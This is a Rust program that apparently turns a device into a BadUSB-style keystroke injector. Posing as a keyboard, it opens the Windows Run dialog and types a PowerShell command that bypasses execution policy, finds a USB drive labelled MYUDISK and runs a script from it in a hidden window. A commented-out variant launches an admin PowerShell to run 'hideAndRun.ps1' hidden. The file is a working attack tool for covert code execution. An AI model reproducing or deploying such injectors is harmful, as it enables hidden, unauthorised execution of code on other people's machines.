use std::{thread::sleep, time::Duration};

use hidg::{Class, Device, Key, Keyboard};
use simple_logger::SimpleLogger;
use hid_simulator::KeyboardHelper;

// const DRIVER_NAME: &str = "MYUDISK";
// const SCRIPT_PATH: &str = "hideAndRun.ps1";

fn main() -> std::io::Result<()> {
    SimpleLogger::new().init().unwrap();

    let mut device = Device::<Keyboard>::open(0)?;
    let mut input = Keyboard.input();
    let mut key_helper = KeyboardHelper::new(&mut device, &mut input);
    // let mut simulator = KeySimulator::new(&mut key_helper);

    // simulator.open_powershell_admin()?;
    // simulator.get_driver_letter(DRIVER_NAME)?;
    // simulator.run_command_in_powershell(format!("Start-Process -FilePath \"powershell.exe\" \
    //     -ArgumentList \"-ExecutionPolicy Bypass -WindowStyle Hidden -File ${{{DRIVER_LETTER_VAR_NAME}}}\\{SCRIPT_PATH}\"").as_str())?;
    // simulator.run_command_in_powershell("exit")?;

    key_helper.press_multi(&[Key::LeftMeta, Key::R])?;
    sleep(Duration::from_millis(500));
    key_helper.press_cmd("powershell -ExecutionPolicy Bypass -command \"$d = \
        (Get-WmiObject -Query 'SELECT DeviceID FROM Win32_LogicalDisk WHERE VolumeName=\\\"MYUDISK\\\"').DeviceID; \
        Start-Process -WindowStyle Hidden -FilePath \\\"powershell\\\" -ArgumentList \\\"-File ${d}\\r.ps1\\\"\"")?;
    key_helper.press_one(Key::Enter)?;  // 目前不用管理员启动，管理员则是ctrl + shift + enter

    Ok(())
}